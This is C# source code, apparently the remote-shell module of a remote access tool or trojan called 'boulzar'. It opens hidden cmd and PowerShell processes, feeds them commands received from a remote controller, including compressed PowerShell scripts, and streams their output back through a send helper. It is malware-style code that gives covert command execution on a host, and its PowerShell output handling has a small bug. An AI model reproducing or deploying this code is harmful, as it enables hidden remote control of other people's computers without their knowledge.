using boulzar.Other;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;


namespace boulzar.Methods
{
    public class cmd_shell : IDisposable
    {

        #region Declarations
        private Process proc;
        private bool _read;
        private readonly object _readLock = new object();
        private readonly object _readStreamLock = new object();

        public bool IsRuning = false;
        #endregion



        private void CreateNewSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            CultureInfo cultureInfo = CultureInfo.InstalledUICulture;

            proc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    StandardErrorEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    //      Arguments = "/K"
                }
            };

            proc.Start();

            IsRuning = true;
            // Fire up the logic to redirect the outputs and handle them.
            RedirectOutputs();


        }
        private void RedirectOutputs()
        {
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
        }
        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                StringBuilder streambuffer = new StringBuilder();

                streambuffer.Append((char)firstCharRead);


                while (streamReader.Peek() > -1)
                {

                    var ch = streamReader.Read();


                    streambuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streambuffer, isError);
                }

                SendAndFlushBuffer(ref streambuffer, isError);
            }
        }
        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
        {
            if (textbuffer.Length == 0) return;

            var toSend = textbuffer.ToString();

            if (string.IsNullOrEmpty(toSend)) return;

            if (isError)
            {
                Helpers.Send(DataType.cmdOutput_Err, Helpers.Getbytes(toSend));
            }
            else
            {
                Helpers.Send(DataType.Cmdoutput, Helpers.Getbytes(toSend));
            }

            textbuffer.Length = 0;
        }


        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                while (proc != null && !proc.HasExited && (ch = proc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, proc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch
            {

            }





        }


        private void RedirectStandardError()
        {
            try
            {
                int ch;


                while (proc != null && !proc.HasExited && (ch = proc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, proc.StandardError, true);
                }

                lock (_readLock)
                {

                }
            }
            catch
            {

            }



        }


        public bool ExecuteCommand(string command)
        {

            try
            {
                string[] strCmd = command.Split('|');
                proc.StandardInput.WriteLine(strCmd[1]);
                proc.StandardInput.Flush();

            }
            catch
            {


            }




            return true;



        }

        /// <summary>
        /// Constructor, creates a new session.
        /// </summary>
        public cmd_shell()
        {
            CreateNewSession();
        }

        #region Disposition 
        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);

        }
        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                if (proc == null) return;

                if (!proc.HasExited)
                {
                    try
                    {
                        proc.Kill();
                    }
                    catch
                    {
                    }
                }
                proc.Dispose();
                proc = null;
            }
        }
        #endregion

    }

    public class PowerShell
    {

        #region Declarations
        private Process proc;

        private bool _read;
        private readonly object _readLock = new object();
        private readonly object _readStreamLock = new object();

        public bool IsRuning = false;
        #endregion



        private void CreateNewSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            CultureInfo cultureInfo = CultureInfo.InstalledUICulture;

            proc = new Process
            {
                StartInfo = new ProcessStartInfo("powershell")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    StandardErrorEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),

                }
            };

            proc.Start();
            IsRuning = true;

            // Fire up the logic to redirect the outputs and handle them.
            RedirectOutputs();


        }
        private void RedirectOutputs()
        {
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
        }
        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                StringBuilder streambuffer = new StringBuilder();

                streambuffer.Append((char)firstCharRead);


                while (streamReader.Peek() > -1)
                {

                    var ch = streamReader.Read();


                    streambuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streambuffer, isError);
                }

                SendAndFlushBuffer(ref streambuffer, isError);
            }
        }
        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
        {
            if (textbuffer.Length == 0) return;

            var toSend = textbuffer.ToString();

            if (string.IsNullOrEmpty(toSend)) return;

            if (isError)
            {
                Helpers.Send(DataType.PsErrOutput, Helpers.Getbytes(toSend));
            }
            else
            {
                Helpers.Send(DataType.PsErrOutput, Helpers.Getbytes(toSend));
            }

            textbuffer.Length = 0;
        }


        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                while (proc != null && !proc.HasExited && (ch = proc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, proc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch
            {

            }





        }


        private void RedirectStandardError()
        {
            try
            {
                int ch;


                while (proc != null && !proc.HasExited && (ch = proc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, proc.StandardError, true);
                }

                lock (_readLock)
                {

                }
            }
            catch
            {

            }



        }


        public bool ExecuteCommand(string command)
        {

            try
            {

                string[] strPS = command.Split('|');
                if (command.StartsWith("PS|_Script|"))
                {
                    strPS[1] = Helpers.DecompressString(strPS[1]);
                }

                proc.StandardInput.WriteLine(strPS[1]);
                proc.StandardInput.Flush();

            }
            catch
            {


            }




            return true;



        }

        public PowerShell()
        {
            CreateNewSession();
        }

        #region Disposition 
        public void Dispose()
        {
            try
            {
                Dispose(true);

                GC.SuppressFinalize(this);
            }
            catch
            {

            }

        }
        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                if (proc == null) return;

                if (!proc.HasExited)
                {
                    try
                    {
                        proc.Kill();
                    }
                    catch
                    {
                    }
                }
                proc.Dispose();
                proc = null;
            }
        }
        #endregion
    }






}




